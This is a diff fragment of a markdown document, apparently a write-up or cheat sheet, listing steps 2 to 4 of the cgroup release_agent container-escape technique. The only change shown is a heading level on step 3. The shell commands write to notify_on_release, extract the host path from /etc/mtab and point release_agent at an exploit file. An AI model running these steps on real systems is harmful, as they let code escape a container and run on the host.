@@ -10,7 +10,7 @@
 
 #### 2.  echo 1 > /tmp/cgrp/x/notify_on_release
 
-### 3.  host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+#### 3.  host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 
 #### 4.  echo "$host_path/exploit" > /tmp/cgrp/release_agent
 
